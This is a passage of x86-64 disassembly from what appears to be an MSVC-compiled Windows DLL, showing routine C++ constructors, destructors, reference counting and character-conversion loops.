   1800016a6:	48 89 45 07          	mov    %rax,0x7(%rbp)
   1800016aa:	c6 45 0f 01          	movb   $0x1,0xf(%rbp)
   1800016ae:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   1800016b2:	e8 35 80 01 00       	call   0x1800196ec
   1800016b7:	48 8d 05 e2 ee 03 00 	lea    0x3eee2(%rip),%rax        # 0x1800405a0
   1800016be:	48 89 03             	mov    %rax,(%rbx)
   1800016c1:	48 8b 55 d7          	mov    -0x29(%rbp),%rdx
   1800016c5:	48 83 fa 10          	cmp    $0x10,%rdx
   1800016c9:	72 2d                	jb     0x1800016f8
   1800016cb:	48 ff c2             	inc    %rdx
   1800016ce:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   1800016d2:	48 8b c1             	mov    %rcx,%rax
   1800016d5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800016dc:	72 15                	jb     0x1800016f3
   1800016de:	48 83 c2 27          	add    $0x27,%rdx
   1800016e2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800016e6:	48 2b c1             	sub    %rcx,%rax
   1800016e9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800016ed:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800016f1:	77 33                	ja     0x180001726
   1800016f3:	e8 38 62 01 00       	call   0x180017930
   1800016f8:	48 8d 05 41 fd 03 00 	lea    0x3fd41(%rip),%rax        # 0x180041440
   1800016ff:	48 89 03             	mov    %rax,(%rbx)
   180001702:	0f 10 06             	movups (%rsi),%xmm0
   180001705:	0f 11 43 18          	movups %xmm0,0x18(%rbx)
   180001709:	48 8b c3             	mov    %rbx,%rax
   18000170c:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   180001710:	48 33 cc             	xor    %rsp,%rcx
   180001713:	e8 f8 61 01 00       	call   0x180017910
   180001718:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   18000171f:	41 5e                	pop    %r14
   180001721:	5f                   	pop    %rdi
   180001722:	5e                   	pop    %rsi
   180001723:	5b                   	pop    %rbx
   180001724:	5d                   	pop    %rbp
   180001725:	c3                   	ret
   180001726:	e8 d5 ed 01 00       	call   0x180020500
   18000172b:	90                   	nop
   18000172c:	e8 cf ed 01 00       	call   0x180020500
   180001731:	90                   	nop
   180001732:	cc                   	int3
   180001733:	cc                   	int3
   180001734:	cc                   	int3
   180001735:	cc                   	int3
   180001736:	cc                   	int3
   180001737:	cc                   	int3
   180001738:	cc                   	int3
   180001739:	cc                   	int3
   18000173a:	cc                   	int3
   18000173b:	cc                   	int3
   18000173c:	cc                   	int3
   18000173d:	cc                   	int3
   18000173e:	cc                   	int3
   18000173f:	cc                   	int3
   180001740:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001745:	57                   	push   %rdi
   180001746:	48 83 ec 20          	sub    $0x20,%rsp
   18000174a:	48 8d 05 c7 ed 03 00 	lea    0x3edc7(%rip),%rax        # 0x180040518
   180001751:	48 8b f9             	mov    %rcx,%rdi
   180001754:	48 89 01             	mov    %rax,(%rcx)
   180001757:	8b da                	mov    %edx,%ebx
   180001759:	48 83 c1 08          	add    $0x8,%rcx
   18000175d:	e8 1a 80 01 00       	call   0x18001977c
   180001762:	f6 c3 01             	test   $0x1,%bl
   180001765:	74 0d                	je     0x180001774
   180001767:	ba 28 00 00 00       	mov    $0x28,%edx
   18000176c:	48 8b cf             	mov    %rdi,%rcx
   18000176f:	e8 bc 61 01 00       	call   0x180017930
   180001774:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001779:	48 8b c7             	mov    %rdi,%rax
   18000177c:	48 83 c4 20          	add    $0x20,%rsp
   180001780:	5f                   	pop    %rdi
   180001781:	c3                   	ret
   180001782:	cc                   	int3
   180001783:	cc                   	int3
   180001784:	cc                   	int3
   180001785:	cc                   	int3
   180001786:	cc                   	int3
   180001787:	cc                   	int3
   180001788:	cc                   	int3
   180001789:	cc                   	int3
   18000178a:	cc                   	int3
   18000178b:	cc                   	int3
   18000178c:	cc                   	int3
   18000178d:	cc                   	int3
   18000178e:	cc                   	int3
   18000178f:	cc                   	int3
   180001790:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001795:	57                   	push   %rdi
   180001796:	48 83 ec 20          	sub    $0x20,%rsp
   18000179a:	48 8b da             	mov    %rdx,%rbx
   18000179d:	48 8d 05 74 ed 03 00 	lea    0x3ed74(%rip),%rax        # 0x180040518
   1800017a4:	48 89 01             	mov    %rax,(%rcx)
   1800017a7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1800017ab:	48 8b f9             	mov    %rcx,%rdi
   1800017ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800017b1:	0f 11 02             	movups %xmm0,(%rdx)
   1800017b4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1800017b8:	e8 2f 7f 01 00       	call   0x1800196ec
   1800017bd:	48 8d 05 7c fc 03 00 	lea    0x3fc7c(%rip),%rax        # 0x180041440
   1800017c4:	48 89 07             	mov    %rax,(%rdi)
   1800017c7:	48 8d 05 8a fc 03 00 	lea    0x3fc8a(%rip),%rax        # 0x180041458
   1800017ce:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   1800017d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800017d7:	48 89 07             	mov    %rax,(%rdi)
   1800017da:	48 8b c7             	mov    %rdi,%rax
   1800017dd:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   1800017e1:	48 83 c4 20          	add    $0x20,%rsp
   1800017e5:	5f                   	pop    %rdi
   1800017e6:	c3                   	ret
   1800017e7:	cc                   	int3
   1800017e8:	cc                   	int3
   1800017e9:	cc                   	int3
   1800017ea:	cc                   	int3
   1800017eb:	cc                   	int3
   1800017ec:	cc                   	int3
   1800017ed:	cc                   	int3
   1800017ee:	cc                   	int3
   1800017ef:	cc                   	int3
   1800017f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800017f5:	57                   	push   %rdi
   1800017f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800017fa:	48 8b da             	mov    %rdx,%rbx
   1800017fd:	48 8d 05 14 ed 03 00 	lea    0x3ed14(%rip),%rax        # 0x180040518
   180001804:	48 89 01             	mov    %rax,(%rcx)
   180001807:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   18000180b:	48 8b f9             	mov    %rcx,%rdi
   18000180e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001811:	0f 11 02             	movups %xmm0,(%rdx)
   180001814:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180001818:	e8 cf 7e 01 00       	call   0x1800196ec
   18000181d:	48 8d 05 1c fc 03 00 	lea    0x3fc1c(%rip),%rax        # 0x180041440
   180001824:	48 89 07             	mov    %rax,(%rdi)
   180001827:	48 8b c7             	mov    %rdi,%rax
   18000182a:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   18000182e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001833:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   180001837:	48 83 c4 20          	add    $0x20,%rsp
   18000183b:	5f                   	pop    %rdi
   18000183c:	c3                   	ret
   18000183d:	cc                   	int3
   18000183e:	cc                   	int3
   18000183f:	cc                   	int3
   180001840:	48 8d 05 69 d9 04 00 	lea    0x4d969(%rip),%rax        # 0x18004f1b0
   180001847:	c3                   	ret
   180001848:	cc                   	int3
   180001849:	cc                   	int3
   18000184a:	cc                   	int3
   18000184b:	cc                   	int3
   18000184c:	cc                   	int3
   18000184d:	cc                   	int3
   18000184e:	cc                   	int3
   18000184f:	cc                   	int3
   180001850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001855:	57                   	push   %rdi
   180001856:	48 83 ec 30          	sub    $0x30,%rsp
   18000185a:	33 ff                	xor    %edi,%edi
   18000185c:	48 8b da             	mov    %rdx,%rbx
   18000185f:	41 83 f8 01          	cmp    $0x1,%r8d
   180001863:	75 1f                	jne    0x180001884
   180001865:	48 89 3a             	mov    %rdi,(%rdx)
   180001868:	44 8d 47 15          	lea    0x15(%rdi),%r8d
   18000186c:	48 89 7a 10          	mov    %rdi,0x10(%rdx)
   180001870:	48 c7 42 18 0f 00 00 	movq   $0xf,0x18(%rdx)
   180001877:	00 
   180001878:	40 88 3a             	mov    %dil,(%rdx)
   18000187b:	48 8d 15 2e e5 04 00 	lea    0x4e52e(%rip),%rdx        # 0x18004fdb0
   180001882:	eb 2d                	jmp    0x1800018b1
   180001884:	41 8b c8             	mov    %r8d,%ecx
   180001887:	e8 88 4c 01 00       	call   0x180016514
   18000188c:	48 89 3b             	mov    %rdi,(%rbx)
   18000188f:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180001896:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   18000189a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1800018a1:	00 
   1800018a2:	40 88 3b             	mov    %dil,(%rbx)
   1800018a5:	49 ff c0             	inc    %r8
   1800018a8:	42 38 3c 00          	cmp    %dil,(%rax,%r8,1)
   1800018ac:	75 f7                	jne    0x1800018a5
   1800018ae:	48 8b d0             	mov    %rax,%rdx
   1800018b1:	48 8b cb             	mov    %rbx,%rcx
   1800018b4:	e8 e7 bf 00 00       	call   0x18000d8a0
   1800018b9:	48 8b c3             	mov    %rbx,%rax
   1800018bc:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800018c1:	48 83 c4 30          	add    $0x30,%rsp
   1800018c5:	5f                   	pop    %rdi
   1800018c6:	c3                   	ret
   1800018c7:	cc                   	int3
   1800018c8:	cc                   	int3
   1800018c9:	cc                   	int3
   1800018ca:	cc                   	int3
   1800018cb:	cc                   	int3
   1800018cc:	cc                   	int3
   1800018cd:	cc                   	int3
   1800018ce:	cc                   	int3
   1800018cf:	cc                   	int3
   1800018d0:	40 53                	rex push %rbx
   1800018d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800018d6:	48 8b d9             	mov    %rcx,%rbx
   1800018d9:	f6 c2 01             	test   $0x1,%dl
   1800018dc:	74 0a                	je     0x1800018e8
   1800018de:	ba 10 00 00 00       	mov    $0x10,%edx
   1800018e3:	e8 48 60 01 00       	call   0x180017930
   1800018e8:	48 8b c3             	mov    %rbx,%rax
   1800018eb:	48 83 c4 20          	add    $0x20,%rsp
   1800018ef:	5b                   	pop    %rbx
   1800018f0:	c3                   	ret
   1800018f1:	cc                   	int3
   1800018f2:	cc                   	int3
   1800018f3:	cc                   	int3
   1800018f4:	cc                   	int3
   1800018f5:	cc                   	int3
   1800018f6:	cc                   	int3
   1800018f7:	cc                   	int3
   1800018f8:	cc                   	int3
   1800018f9:	cc                   	int3
   1800018fa:	cc                   	int3
   1800018fb:	cc                   	int3
   1800018fc:	cc                   	int3
   1800018fd:	cc                   	int3
   1800018fe:	cc                   	int3
   1800018ff:	cc                   	int3
   180001900:	48 8d 05 b9 d8 04 00 	lea    0x4d8b9(%rip),%rax        # 0x18004f1c0
   180001907:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000190e:	00 
   18000190f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001913:	48 8d 05 8e fb 03 00 	lea    0x3fb8e(%rip),%rax        # 0x1800414a8
   18000191a:	48 89 01             	mov    %rax,(%rcx)
   18000191d:	48 8b c1             	mov    %rcx,%rax
   180001920:	c3                   	ret
   180001921:	cc                   	int3
   180001922:	cc                   	int3
   180001923:	cc                   	int3
   180001924:	cc                   	int3
   180001925:	cc                   	int3
   180001926:	cc                   	int3
   180001927:	cc                   	int3
   180001928:	cc                   	int3
   180001929:	cc                   	int3
   18000192a:	cc                   	int3
   18000192b:	cc                   	int3
   18000192c:	cc                   	int3
   18000192d:	cc                   	int3
   18000192e:	cc                   	int3
   18000192f:	cc                   	int3
   180001930:	48 83 ec 48          	sub    $0x48,%rsp
   180001934:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001939:	e8 c2 ff ff ff       	call   0x180001900
   18000193e:	48 8d 15 83 40 05 00 	lea    0x54083(%rip),%rdx        # 0x1800559c8
   180001945:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000194a:	e8 7d 7e 01 00       	call   0x1800197cc
   18000194f:	cc                   	int3
   180001950:	40 53                	rex push %rbx
   180001952:	48 83 ec 20          	sub    $0x20,%rsp
   180001956:	48 8b d9             	mov    %rcx,%rbx
   180001959:	48 8b c2             	mov    %rdx,%rax
   18000195c:	48 8d 0d b5 eb 03 00 	lea    0x3ebb5(%rip),%rcx        # 0x180040518
   180001963:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001966:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000196a:	48 89 0b             	mov    %rcx,(%rbx)
   18000196d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001971:	0f 11 02             	movups %xmm0,(%rdx)
   180001974:	e8 73 7d 01 00       	call   0x1800196ec
   180001979:	48 8d 05 28 fb 03 00 	lea    0x3fb28(%rip),%rax        # 0x1800414a8
   180001980:	48 89 03             	mov    %rax,(%rbx)
   180001983:	48 8b c3             	mov    %rbx,%rax
   180001986:	48 83 c4 20          	add    $0x20,%rsp
   18000198a:	5b                   	pop    %rbx
   18000198b:	c3                   	ret
   18000198c:	cc                   	int3
   18000198d:	cc                   	int3
   18000198e:	cc                   	int3
   18000198f:	cc                   	int3
   180001990:	40 53                	rex push %rbx
   180001992:	48 83 ec 20          	sub    $0x20,%rsp
   180001996:	48 8d 05 3b fa 03 00 	lea    0x3fa3b(%rip),%rax        # 0x1800413d8
   18000199d:	48 8b d9             	mov    %rcx,%rbx
   1800019a0:	48 89 01             	mov    %rax,(%rcx)
   1800019a3:	f6 c2 01             	test   $0x1,%dl
   1800019a6:	74 0a                	je     0x1800019b2
   1800019a8:	ba 08 00 00 00       	mov    $0x8,%edx
   1800019ad:	e8 7e 5f 01 00       	call   0x180017930
   1800019b2:	48 8b c3             	mov    %rbx,%rax
   1800019b5:	48 83 c4 20          	add    $0x20,%rsp
   1800019b9:	5b                   	pop    %rbx
   1800019ba:	c3                   	ret
   1800019bb:	cc                   	int3
   1800019bc:	cc                   	int3
   1800019bd:	cc                   	int3
   1800019be:	cc                   	int3
   1800019bf:	cc                   	int3
   1800019c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800019c5:	57                   	push   %rdi
   1800019c6:	48 83 ec 20          	sub    $0x20,%rsp
   1800019ca:	48 8b d9             	mov    %rcx,%rbx
   1800019cd:	e8 e6 4e 01 00       	call   0x1800168b8
   1800019d2:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   1800019d6:	48 85 c9             	test   %rcx,%rcx
   1800019d9:	74 05                	je     0x1800019e0
   1800019db:	e8 d8 e8 01 00       	call   0x1800202b8
   1800019e0:	33 ff                	xor    %edi,%edi
   1800019e2:	48 89 7b 58          	mov    %rdi,0x58(%rbx)
   1800019e6:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   1800019ea:	48 85 c9             	test   %rcx,%rcx
   1800019ed:	74 05                	je     0x1800019f4
   1800019ef:	e8 c4 e8 01 00       	call   0x1800202b8
   1800019f4:	48 89 7b 48          	mov    %rdi,0x48(%rbx)
   1800019f8:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   1800019fc:	48 85 c9             	test   %rcx,%rcx
   1800019ff:	74 05                	je     0x180001a06
   180001a01:	e8 b2 e8 01 00       	call   0x1800202b8
   180001a06:	48 89 7b 38          	mov    %rdi,0x38(%rbx)
   180001a0a:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180001a0e:	48 85 c9             	test   %rcx,%rcx
   180001a11:	74 05                	je     0x180001a18
   180001a13:	e8 a0 e8 01 00       	call   0x1800202b8
   180001a18:	48 89 7b 28          	mov    %rdi,0x28(%rbx)
   180001a1c:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   180001a20:	48 85 c9             	test   %rcx,%rcx
   180001a23:	74 05                	je     0x180001a2a
   180001a25:	e8 8e e8 01 00       	call   0x1800202b8
   180001a2a:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   180001a2e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180001a32:	48 85 c9             	test   %rcx,%rcx
   180001a35:	74 05                	je     0x180001a3c
   180001a37:	e8 7c e8 01 00       	call   0x1800202b8
   180001a3c:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   180001a40:	48 8b cb             	mov    %rbx,%rcx
   180001a43:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001a48:	48 83 c4 20          	add    $0x20,%rsp
   180001a4c:	5f                   	pop    %rdi
   180001a4d:	e9 56 48 01 00       	jmp    0x1800162a8
   180001a52:	cc                   	int3
   180001a53:	cc                   	int3
   180001a54:	cc                   	int3
   180001a55:	cc                   	int3
   180001a56:	cc                   	int3
   180001a57:	cc                   	int3
   180001a58:	cc                   	int3
   180001a59:	cc                   	int3
   180001a5a:	cc                   	int3
   180001a5b:	cc                   	int3
   180001a5c:	cc                   	int3
   180001a5d:	cc                   	int3
   180001a5e:	cc                   	int3
   180001a5f:	cc                   	int3
   180001a60:	f0 ff 41 08          	lock incl 0x8(%rcx)
   180001a64:	c3                   	ret
   180001a65:	cc                   	int3
   180001a66:	cc                   	int3
   180001a67:	cc                   	int3
   180001a68:	cc                   	int3
   180001a69:	cc                   	int3
   180001a6a:	cc                   	int3
   180001a6b:	cc                   	int3
   180001a6c:	cc                   	int3
   180001a6d:	cc                   	int3
   180001a6e:	cc                   	int3
   180001a6f:	cc                   	int3
   180001a70:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   180001a75:	b8 00 00 00 00       	mov    $0x0,%eax
   180001a7a:	48 0f 44 c1          	cmove  %rcx,%rax
   180001a7e:	c3                   	ret
   180001a7f:	cc                   	int3
   180001a80:	48 8d 05 51 f9 03 00 	lea    0x3f951(%rip),%rax        # 0x1800413d8
   180001a87:	48 89 01             	mov    %rax,(%rcx)
   180001a8a:	c3                   	ret
   180001a8b:	cc                   	int3
   180001a8c:	cc                   	int3
   180001a8d:	cc                   	int3
   180001a8e:	cc                   	int3
   180001a8f:	cc                   	int3
   180001a90:	48 83 ec 28          	sub    $0x28,%rsp
   180001a94:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   180001a98:	48 85 c9             	test   %rcx,%rcx
   180001a9b:	74 1d                	je     0x180001aba
   180001a9d:	48 8b 01             	mov    (%rcx),%rax
   180001aa0:	ff 50 10             	call   *0x10(%rax)
   180001aa3:	48 85 c0             	test   %rax,%rax
   180001aa6:	74 12                	je     0x180001aba
   180001aa8:	4c 8b 00             	mov    (%rax),%r8
   180001aab:	ba 01 00 00 00       	mov    $0x1,%edx
   180001ab0:	48 8b c8             	mov    %rax,%rcx
   180001ab3:	48 83 c4 28          	add    $0x28,%rsp
   180001ab7:	49 ff 20             	rex.WB jmp *(%r8)
   180001aba:	48 83 c4 28          	add    $0x28,%rsp
   180001abe:	c3                   	ret
   180001abf:	cc                   	int3
   180001ac0:	b8 01 00 00 00       	mov    $0x1,%eax
   180001ac5:	c3                   	ret
   180001ac6:	cc                   	int3
   180001ac7:	cc                   	int3
   180001ac8:	cc                   	int3
   180001ac9:	cc                   	int3
   180001aca:	cc                   	int3
   180001acb:	cc                   	int3
   180001acc:	cc                   	int3
   180001acd:	cc                   	int3
   180001ace:	cc                   	int3
   180001acf:	cc                   	int3
   180001ad0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001ad5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001ada:	55                   	push   %rbp
   180001adb:	57                   	push   %rdi
   180001adc:	41 56                	push   %r14
   180001ade:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   180001ae3:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   180001aea:	48 8b da             	mov    %rdx,%rbx
   180001aed:	48 8b f9             	mov    %rcx,%rdi
   180001af0:	45 33 f6             	xor    %r14d,%r14d
   180001af3:	48 85 c9             	test   %rcx,%rcx
   180001af6:	0f 84 34 01 00 00    	je     0x180001c30
   180001afc:	4c 39 31             	cmp    %r14,(%rcx)
   180001aff:	0f 85 2b 01 00 00    	jne    0x180001c30
   180001b05:	41 8d 4e 30          	lea    0x30(%r14),%ecx
   180001b09:	e8 56 5e 01 00       	call   0x180017964
   180001b0e:	48 8b f0             	mov    %rax,%rsi
   180001b11:	48 89 45 67          	mov    %rax,0x67(%rbp)
   180001b15:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180001b19:	48 85 c9             	test   %rcx,%rcx
   180001b1c:	74 0f                	je     0x180001b2d
   180001b1e:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   180001b22:	48 85 db             	test   %rbx,%rbx
   180001b25:	75 0d                	jne    0x180001b34
   180001b27:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   180001b2b:	eb 07                	jmp    0x180001b34
   180001b2d:	48 8d 1d 77 d6 04 00 	lea    0x4d677(%rip),%rbx        # 0x18004f1ab
   180001b34:	33 d2                	xor    %edx,%edx
   180001b36:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180001b3a:	e8 f1 46 01 00       	call   0x180016230
   180001b3f:	90                   	nop
   180001b40:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   180001b44:	c6 45 c7 00          	movb   $0x0,-0x39(%rbp)
   180001b48:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   180001b4c:	c6 45 d7 00          	movb   $0x0,-0x29(%rbp)
   180001b50:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   180001b54:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   180001b59:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   180001b5d:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   180001b62:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   180001b66:	c6 45 07 00          	movb   $0x0,0x7(%rbp)
   180001b6a:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   180001b6e:	c6 45 17 00          	movb   $0x0,0x17(%rbp)
   180001b72:	48 85 db             	test   %rbx,%rbx
   180001b75:	0f 84 d2 00 00 00    	je     0x180001c4d
   180001b7b:	48 8b d3             	mov    %rbx,%rdx
   180001b7e:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180001b82:	e8 c5 4c 01 00       	call   0x18001684c
   180001b87:	90                   	nop
   180001b88:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   180001b8c:	48 8d 05 2d f9 03 00 	lea    0x3f92d(%rip),%rax        # 0x1800414c0
   180001b93:	48 89 06             	mov    %rax,(%rsi)
   180001b96:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   180001b9a:	e8 09 4e 01 00       	call   0x1800169a8
   180001b9f:	0f 10 00             	movups (%rax),%xmm0
   180001ba2:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   180001ba6:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180001baa:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   180001bae:	48 89 37             	mov    %rsi,(%rdi)
   180001bb1:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180001bb5:	e8 fe 4c 01 00       	call   0x1800168b8
   180001bba:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   180001bbe:	48 85 c9             	test   %rcx,%rcx
   180001bc1:	74 05                	je     0x180001bc8
   180001bc3:	e8 f0 e6 01 00       	call   0x1800202b8
   180001bc8:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   180001bcc:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   180001bd0:	48 85 c9             	test   %rcx,%rcx
   180001bd3:	74 05                	je     0x180001bda
   180001bd5:	e8 de e6 01 00       	call   0x1800202b8
   180001bda:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   180001bde:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   180001be2:	48 85 c9             	test   %rcx,%rcx
   180001be5:	74 05                	je     0x180001bec
   180001be7:	e8 cc e6 01 00       	call   0x1800202b8
   180001bec:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   180001bf0:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   180001bf4:	48 85 c9             	test   %rcx,%rcx
   180001bf7:	74 05                	je     0x180001bfe
   180001bf9:	e8 ba e6 01 00       	call   0x1800202b8
   180001bfe:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   180001c02:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   180001c06:	48 85 c9             	test   %rcx,%rcx
   180001c09:	74 05                	je     0x180001c10
   180001c0b:	e8 a8 e6 01 00       	call   0x1800202b8
   180001c10:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   180001c14:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   180001c18:	48 85 c9             	test   %rcx,%rcx
   180001c1b:	74 05                	je     0x180001c22
   180001c1d:	e8 96 e6 01 00       	call   0x1800202b8
   180001c22:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   180001c26:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180001c2a:	e8 79 46 01 00       	call   0x1800162a8
   180001c2f:	90                   	nop
   180001c30:	b8 02 00 00 00       	mov    $0x2,%eax
   180001c35:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   180001c3c:	00 
   180001c3d:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180001c41:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180001c45:	49 8b e3             	mov    %r11,%rsp
   180001c48:	41 5e                	pop    %r14
   180001c4a:	5f                   	pop    %rdi
   180001c4b:	5d                   	pop    %rbp
   180001c4c:	c3                   	ret
   180001c4d:	48 8d 0d 7c d5 04 00 	lea    0x4d57c(%rip),%rcx        # 0x18004f1d0
   180001c54:	e8 97 48 01 00       	call   0x1800164f0
   180001c59:	cc                   	int3
   180001c5a:	cc                   	int3
   180001c5b:	cc                   	int3
   180001c5c:	cc                   	int3
   180001c5d:	cc                   	int3
   180001c5e:	cc                   	int3
   180001c5f:	cc                   	int3
   180001c60:	0f b6 c2             	movzbl %dl,%eax
   180001c63:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   180001c67:	8b c8                	mov    %eax,%ecx
   180001c69:	e9 fa 4d 01 00       	jmp    0x180016a68
   180001c6e:	cc                   	int3
   180001c6f:	cc                   	int3
   180001c70:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001c75:	56                   	push   %rsi
   180001c76:	48 83 ec 20          	sub    $0x20,%rsp
   180001c7a:	49 8b f0             	mov    %r8,%rsi
   180001c7d:	48 8b da             	mov    %rdx,%rbx
   180001c80:	49 3b d0             	cmp    %r8,%rdx
   180001c83:	74 25                	je     0x180001caa
   180001c85:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   180001c8a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   180001c8e:	66 90                	xchg   %ax,%ax
   180001c90:	0f b6 0b             	movzbl (%rbx),%ecx
   180001c93:	48 8b d7             	mov    %rdi,%rdx
   180001c96:	e8 cd 4d 01 00       	call   0x180016a68
   180001c9b:	88 03                	mov    %al,(%rbx)
   180001c9d:	48 ff c3             	inc    %rbx
   180001ca0:	48 3b de             	cmp    %rsi,%rbx
   180001ca3:	75 eb                	jne    0x180001c90
   180001ca5:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180001caa:	48 8b c3             	mov    %rbx,%rax
   180001cad:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180001cb2:	48 83 c4 20          	add    $0x20,%rsp
   180001cb6:	5e                   	pop    %rsi
   180001cb7:	c3                   	ret
   180001cb8:	cc                   	int3
   180001cb9:	cc                   	int3
   180001cba:	cc                   	int3
   180001cbb:	cc                   	int3
   180001cbc:	cc                   	int3
   180001cbd:	cc                   	int3
   180001cbe:	cc                   	int3
   180001cbf:	cc                   	int3
   180001cc0:	0f b6 c2             	movzbl %dl,%eax
   180001cc3:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   180001cc7:	8b c8                	mov    %eax,%ecx
   180001cc9:	e9 66 4f 01 00       	jmp    0x180016c34
   180001cce:	cc                   	int3
   180001ccf:	cc                   	int3
   180001cd0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001cd5:	56                   	push   %rsi
   180001cd6:	48 83 ec 20          	sub    $0x20,%rsp
   180001cda:	49 8b f0             	mov    %r8,%rsi
   180001cdd:	48 8b da             	mov    %rdx,%rbx
   180001ce0:	49 3b d0             	cmp    %r8,%rdx
   180001ce3:	74 25                	je     0x180001d0a
   180001ce5:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   180001cea:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   180001cee:	66 90                	xchg   %ax,%ax
   180001cf0:	0f b6 0b             	movzbl (%rbx),%ecx
   180001cf3:	48 8b d7             	mov    %rdi,%rdx
   180001cf6:	e8 39 4f 01 00       	call   0x180016c34
   180001cfb:	88 03                	mov    %al,(%rbx)
   180001cfd:	48 ff c3             	inc    %rbx
   180001d00:	48 3b de             	cmp    %rsi,%rbx
   180001d03:	75 eb                	jne    0x180001cf0
   180001d05:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180001d0a:	48 8b c3             	mov    %rbx,%rax
   180001d0d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180001d12:	48 83 c4 20          	add    $0x20,%rsp
   180001d16:	5e                   	pop    %rsi
   180001d17:	c3                   	ret
   180001d18:	cc                   	int3
